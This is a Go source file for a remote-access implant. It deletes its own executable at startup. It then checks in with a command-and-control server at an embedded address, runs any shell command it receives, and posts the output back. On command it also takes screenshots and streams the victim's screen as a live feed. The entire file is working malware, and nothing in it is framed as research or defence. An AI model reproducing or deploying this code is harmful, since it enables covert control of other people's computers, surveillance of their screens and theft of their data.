// implant/main.go
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	_ "embed"
)

//go:embed placeholder.txt
var implantIDBytes []byte

//go:embed c2_address.txt
var c2AddressBytes []byte

const (
	implantIDPlaceholder = "deadbeef-0000-0000-0000-000000000000"
	c2AddressPlaceholder = "C2_IP_PLACEHOLDER_STRING_PADDING_TO_64_BYTES_XXXXXXXXXXXXXXXXXXXXX"
	checkInInterval      = 5 * time.Second
	livestreamInterval   = 1 * time.Second // How often to send livestream frames
)

var (
	checkInURL         string
	commandsURL        string
	commandResultURL   string
	livestreamFrameURL string // <-- NEW: For sending livestream frames

	// Global state for livestreaming
	isLivestreamActive bool
	stopLivestreamChan chan struct{}
)

// Declarations for platform-specific functions (defined in other files)
var doSelfDelete func(exePath string)
var setOSSpecificAttrs func(cmd *exec.Cmd)
var takeScreenshot func() (string, error)

// implantID extracts the unique implant token.
func implantID() string {
	s := string(implantIDBytes)
	if nullIdx := strings.IndexByte(s, 0); nullIdx != -1 {
		s = s[:nullIdx]
	}
	return strings.TrimSpace(s)
}

// c2ServerAddress extracts the C2 server address.
func c2ServerAddress() string {
	s := string(c2AddressBytes)
	if nullIdx := strings.IndexByte(s, 0); nullIdx != -1 {
		s = s[:nullIdx]
	}
	return strings.TrimSpace(s)
}

type Command struct {
	ID      int    `json:"id"`
	Command string `json:"command"`
}

type CheckInPayload struct {
	ImplantID string `json:"implant_id"`
	IPAddress string `json:"ip_address"`
	PWD       string `json:"pwd"`
}

type CommandResultPayload struct {
	CommandID int    `json:"command_id"`
	Output    string `json:"output"`
}

// NEW: Payload for livestream frames
type LivestreamFramePayload struct {
	ImplantID string `json:"implant_id"`
	FrameData string `json:"frame_data"`
}

func initializeConfig() bool {
	currentImplantID := implantID()
	currentC2Address := c2ServerAddress()

	if currentImplantID == "" || currentImplantID == implantIDPlaceholder {
		return false
	}
	if currentC2Address == "" || currentC2Address == c2AddressPlaceholder {
		return false
	}

	c2BaseURL := currentC2Address
	if !strings.HasPrefix(c2BaseURL, "http://") && !strings.HasPrefix(c2BaseURL, "https://") {
		c2BaseURL = "http://" + c2BaseURL
	}

	checkInURL = fmt.Sprintf("%s/checkin", c2BaseURL)
	commandsURL = fmt.Sprintf("%s/implant-client/%s/commands", c2BaseURL, currentImplantID)
	commandResultURL = fmt.Sprintf("%s/command-result", c2BaseURL)
	livestreamFrameURL = fmt.Sprintf("%s/livestream-frame", c2BaseURL) // <-- NEW
	return true
}

func main() {
	exePath, err := os.Executable()
	if err == nil {
		doSelfDelete(exePath)
	}

	if !initializeConfig() {
		time.Sleep(10 * time.Second)
		return
	}

	// Initialize stopLivestreamChan (it's nil initially)
	// It will be properly created when livestream starts.

	for {
		checkIn()
		fetchAndExecuteCommands()
		time.Sleep(checkInInterval)
	}
}

func checkIn() {
	// If livestreaming, maybe skip full check-in as frames act as keep-alive
	if isLivestreamActive {
		return
	}
	currentPwd, err := os.Getwd()
	if err != nil {
		currentPwd = "error_getting_pwd: " + err.Error()
	}
	payload := CheckInPayload{
		ImplantID: implantID(),
		IPAddress: "",
		PWD:       currentPwd,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return
	}
	resp, err := http.Post(checkInURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func fetchAndExecuteCommands() {
	resp, err := http.Get(commandsURL)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	var respStruct struct {
		Commands []Command `json:"commands"`
	}
	if err := json.Unmarshal(body, &respStruct); err != nil {
		return
	}

	currentImplantID := implantID() // Cache for this loop iteration

	for _, cmdToExec := range respStruct.Commands {
		trimmedCmdStr := strings.TrimSpace(cmdToExec.Command)
		currentPwd, _ := os.Getwd()

		// --- Livestream Start Command ---
		if trimmedCmdStr == "livestream_start" {
			if isLivestreamActive {
				sendOutput(cmdToExec.ID, "Livestream is already active.")
			} else {
				isLivestreamActive = true
				stopLivestreamChan = make(chan struct{}) // Create a new channel for this session
				go runLivestream(currentImplantID, stopLivestreamChan)
				sendOutput(cmdToExec.ID, "Livestream started.")
			}
			continue
		}

		// --- Livestream Stop Command ---
		if trimmedCmdStr == "livestream_stop" {
			if isLivestreamActive {
				isLivestreamActive = false
				if stopLivestreamChan != nil {
					close(stopLivestreamChan) // Signal the goroutine to stop
					stopLivestreamChan = nil  // Set to nil after closing
				}
				sendOutput(cmdToExec.ID, "Livestream stopped.")
			} else {
				sendOutput(cmdToExec.ID, "Livestream is not active.")
			}
			continue
		}

		// --- Screenshot Command Handling ---
		if trimmedCmdStr == "screenshot" {
			outputBase64, err := takeScreenshot()
			if err != nil {
				sendOutput(cmdToExec.ID, fmt.Sprintf("Screenshot failed: %v", err))
			} else {
				sendOutput(cmdToExec.ID, "screenshot_data:"+outputBase64)
			}
			continue
		}
		// --- End Screenshot Command Handling ---

		if strings.HasPrefix(trimmedCmdStr, "cd ") {
			targetDir := strings.TrimSpace(strings.TrimPrefix(trimmedCmdStr, "cd "))
			if targetDir == "" {
				homeDir, homeErr := os.UserHomeDir()
				if homeErr != nil {
					sendOutput(cmdToExec.ID, fmt.Sprintf("%s $ %s\ncd: Could not determine home directory: %s", currentPwd, cmdToExec.Command, homeErr.Error()))
					continue
				}
				targetDir = homeDir
			}
			targetDir = os.ExpandEnv(targetDir)
			err := os.Chdir(targetDir)
			newPwd, _ := os.Getwd()
			prompt := fmt.Sprintf("%s $ %s\n", currentPwd, cmdToExec.Command)
			if err != nil {
				sendOutput(cmdToExec.ID, prompt+fmt.Sprintf("Error changing directory to '%s': %v", targetDir, err))
			} else {
				sendOutput(cmdToExec.ID, prompt+fmt.Sprintf("Changed directory to: %s", newPwd))
			}
			continue
		}

		var command *exec.Cmd
		if runtime.GOOS == "windows" {
			command = exec.Command("cmd", "/C", cmdToExec.Command)
		} else {
			command = exec.Command("sh", "-c", cmdToExec.Command)
		}
		setOSSpecificAttrs(command)
		outputBytes, execErr := command.CombinedOutput()
		resultString := string(outputBytes)
		prompt := fmt.Sprintf("%s $ %s\n", currentPwd, cmdToExec.Command)
		if execErr != nil {
			resultString += "\nExecution Error: " + execErr.Error()
		}
		sendOutput(cmdToExec.ID, prompt+resultString)
	}
}

func sendOutput(cmdID int, output string) {
	payload := CommandResultPayload{
		CommandID: cmdID,
		Output:    output,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return
	}
	resp, err := http.Post(commandResultURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

// NEW: Goroutine for handling livestreaming
func runLivestream(implantToken string, localStopChan <-chan struct{}) {
	fmt.Printf("[%s] Livestream goroutine started.\n", implantToken)
	ticker := time.NewTicker(livestreamInterval)
	defer ticker.Stop()
	defer fmt.Printf("[%s] Livestream goroutine stopped.\n", implantToken)

	for {
		select {
		case <-ticker.C:
			// Check isLivestreamActive primarily, localStopChan is the definitive signal
			if !isLivestreamActive {
				fmt.Printf("[%s] Livestream goroutine: isLivestreamActive is false, exiting.\n", implantToken)
				return
			}

			outputBase64, err := takeScreenshot()
			if err != nil {
				fmt.Printf("[%s] Livestream screenshot failed: %v\n", implantToken, err)
				// Optionally send an error frame or just skip
				continue
			}
			sendLivestreamFrame(implantToken, outputBase64)

		case <-localStopChan:
			fmt.Printf("[%s] Livestream goroutine: Received stop signal via channel.\n", implantToken)
			return
		}
	}
}

// NEW: Function to send a single livestream frame
func sendLivestreamFrame(implantToken string, base64Data string) {
	payload := LivestreamFramePayload{
		ImplantID: implantToken,
		FrameData: base64Data,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Printf("[%s] Error marshalling livestream frame: %v\n", implantToken, err)
		return
	}

	resp, err := http.Post(livestreamFrameURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Printf("[%s] Error sending livestream frame: %v\n", implantToken, err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		bodyBytes, _ := io.ReadAll(resp.Body) // Best effort to read body
		fmt.Printf("[%s] Error sending livestream frame, C2 status: %s, body: %s\n", implantToken, resp.Status, string(bodyBytes))
	}
	// fmt.Printf("[%s] Livestream frame sent successfully.\n", implantToken) // Can be too verbose
}
